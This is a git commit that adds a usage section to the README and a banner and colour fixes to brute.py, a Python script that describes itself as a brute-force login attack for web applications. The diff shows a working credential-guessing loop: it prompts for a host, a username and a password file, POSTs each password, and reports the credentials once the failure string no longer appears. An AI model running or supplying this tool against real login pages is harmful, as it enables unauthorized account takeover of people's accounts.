e88f5ea3ff4101836ba5373ee706b20265defedb
andr <andreahm@gmx.com>
2022-02-26 05:40:12 -0500

    editing files

--- README.md
+++ README.md
@@ -2,3 +2,26 @@
 
 Brute is a brute-force login attack for web applications written in python.
 
+## Usage
+Usage for basic brute-force login script
+
+```
+$ python brute-force-login/brute.py       
+ ____             _         _____              _             
+| __ ) _ __ _   _| |_ ___  |  ___|__  _ __ ___(_)_ __   __ _ 
+|  _ \| '__| | | | __/ _ \ | |_ / _ \| '__/ __| | '_ \ / _` |
+| |_) | |  | |_| | ||  __/ |  _| (_) | | | (__| | | | | (_| |
+|____/|_|   \__,_|\__\___| |_|  \___/|_|  \___|_|_| |_|\__, |
+                                                       |___/ 
+ _                _       
+| |    ___   __ _(_)_ __  
+| |   / _ \ / _` | | '_ \ 
+| |__| (_) | (_| | | | | |
+|_____\___/ \__, |_|_| |_|
+            |___/         
+
+[+] Enter host:       
+[+] Enter username to brute force: 
+[+] Enter file containing passwords: 
+[+] Enter string for failed login:
+```
--- brute.py
+++ brute.py
@@ -1,5 +1,9 @@
+import pyfiglet
 import requests
 from termcolor import colored
+
+welcome_banner=pyfiglet.figlet_format("Brute Forcing Login")
+print(welcome_banner)
 
 url=input("[+] Enter host: ")
 username=input("[+] Enter username to brute force: ")
@@ -9,14 +13,14 @@ login_failed=input("[+] Enter string for failed login: ")
 def brute(username,url):
     for password in passwords:
         password=password.strip()
-        print(colored("Attempting login with "+password), "red")
+        print(colored("Attempting login with "+password, "red"))
         creds={"username":username,"password":password,"Login":"submit"}
         response=requests.post(url, data=creds)
         if login_failed in response.content.decode():
             pass
         else:
-            print(colored("[*] Found username: "+username), "green")
-            print(colored("[*] found password: "+password), "green")
+            print(colored("[*] Found username: "+username, "green"))
+            print(colored("[*] found password: "+password, "green"))
             exit()
 
 with open(password_file, 'r') as passwords:
